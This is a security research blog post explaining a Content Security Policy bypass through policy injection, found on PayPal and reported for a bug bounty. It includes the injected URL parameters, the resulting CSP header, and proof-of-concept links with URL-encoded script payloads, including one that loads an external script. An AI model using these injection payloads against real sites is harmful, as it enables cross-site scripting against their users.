---
source: portswigger-research
source_url: https://portswigger.net/research/bypassing-csp-with-policy-injection
title: "Bypassing CSP with policy injection | PortSwigger Research"
published: 2019-06-05T13:10:20
description: "Whilst testing PayPal looking for ways to bypass CSP and mixed content protection I found an interesting behaviour. PayPal was putting a GET parameter called token inside the report-uri directive of t"
---

# Bypassing CSP with policy injection

![Gareth Heyes](https://portswigger.net/content/images/profiles/callout_gareth_heyes_114px.png)

### [Gareth Heyes](https://portswigger.net/research/gareth-heyes)

Researcher

[@garethheyes](https://twitter.com/garethheyes)

- **Published:** Wednesday, 5 June 2019 at 13:10 UTC

- **Updated:** Friday, 4 September 2020 at 14:31 UTC


![CSP policy injection](https://portswigger.net/cms/images/80/75/c2f7cdcc2432-article-csp_policy_injection_article.png)

Whilst testing PayPal looking for ways to bypass [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy) and mixed content protection I found an interesting behaviour. PayPal was putting a GET parameter called token inside the report-uri directive of their CSP. I found that by changing the token parameter it was possible to inject directives into the policy. Most browsers simply skip over invalid CSP directives, but Edge behaves differently. If it encounters invalid syntax, Edge will drop the entire policy! I fuzzed Edge to find ways of breaking the CSP with as few characters as possible, and found you could simply use a semi-colon and an underscore. So if you loaded the following URL:

https://www.paypal.com/webapps/xoonboarding?values=etc& **token=SOMETOKEN;\_**

You would be served this CSP header:

`Content-Security-Policy: default-src 'self' https://*.paypal.com https://*.paypal.com:* https://*.paypalobjects.com 'unsafe-eval';connect-src 'self' https://*.paypal.com https://nexus.ensighten.com https://*.paypalobjects.com;frame-src 'self' https://*.paypal.com https://*.paypalobjects.com https://*.cardinalcommerce.com;script-src https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline' 'unsafe-eval';style-src 'self' https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline';img-src https: data:;object-src 'none'; report-uri /webapps/xoonboarding/api/log/csp?token=SOMETOKEN;_`

And Edge would drop the entire policy.

To see it in action I created a simple PoC:

[Edge CSP bypass using policy injection](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E)

Of course hardly anyone uses Edge, so then I thought about Chrome. Since Chrome ignores invalid directives and our injection happens at the end of the policy, I needed a way to override a directive. I found a recently proposed directive called " [script-src-elem](https://w3c.github.io/webappsec-csp/#directive-script-src-elem)". This directive allows you to control just script blocks and was created so that you can allow event handlers but block script elements for example:

`Content-Security-Policy: script-src-elem 'none'; script-src-attr 'unsafe-inline'`

`<script>alert("This will be blocked")</script>
<a href="#" onclick="alert('This will be allowed')">test</a>`

The interesting thing about this directive is that it will overwrite existing script-src directives! So you can use it to bypass CSP provided you have policy injection. Here is a PoC that works on Chrome:

[Chrome CSP bypass using policy injection](http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

PayPal awarded me $900 for this bug which I thought was quite generous for a mitigation bypass.

Visit our Web Security Academy to [learn more about cross-site scripting (XSS)](https://portswigger.net/web-security/cross-site-scripting)

[csp](https://portswigger.net/research/csp)

[Back to all articles](https://portswigger.net/research/articles)

## Related Research

[**Using form hijacking to bypass CSP** 05 March 2024Using form hijacking to bypass CSP](https://portswigger.net/research/using-form-hijacking-to-bypass-csp) [**Bypassing CSP via DOM clobbering** 05 June 2023Bypassing CSP via DOM clobbering](https://portswigger.net/research/bypassing-csp-via-dom-clobbering) [**Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO** 28 April 2023Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro) [**Stealing passwords from infosec Mastodon - without bypassing CSP** 15 November 2022Stealing passwords from infosec Mastodon - without bypassing CSP](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp)